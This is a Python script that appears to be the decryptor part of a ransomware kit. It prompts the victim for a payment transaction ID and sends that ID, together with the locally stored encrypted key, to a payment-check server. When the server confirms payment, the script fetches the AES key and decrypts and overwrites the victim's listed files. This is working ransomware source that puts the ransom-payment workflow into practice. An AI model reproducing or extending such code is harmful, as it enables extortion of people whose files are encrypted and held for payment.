import json
import requests
from colorama import init, Fore, Back
from libs.server import *
from libs.crypto import read_encrypted_key, read_file_list, aes_decrypt
init()

txId = input("Enter transaction ID: ")
print(f"{Fore.YELLOW}Wait. I'm checking if payment with transaction {txId} is valid...{Fore.RESET}")

request_data = {
    "transactionId": txId,
    "encryptedKey": read_encrypted_key()
}

response = requests.post(payment_check, request_data)
server_response = json.loads(response.text)
if (server_response['status'] == "success"):
    key = server_response['key']
    print(f"{Fore.GREEN}[+] Payment is valid! Decrypted key fetched!{Fore.RESET}")
    print(f"{Fore.YELLOW}    - Key: {key}{Fore.RESET}")
    print(f"{Fore.YELLOW}[*] Decryption started{Fore.RESET}")
    files = read_file_list()
    for i in files:
        print(f"{Fore.YELLOW}    [*] Decrypting {i}...{Fore.RESET}")
        try:
            decrypted = aes_decrypt(i, key)
            with open(i, "w") as f:
                f.write(decrypted)
            print(f"{Fore.GREEN}    [+] {i} decrypted!{Fore.RESET}")
        except:
            print(f"{Fore.RED}    [!] Error while decrypting {i}{Fore.RESET}")
else:
    print(f"{Fore.RED}[!] Payment is not valid!{Fore.RESET}")
    exit()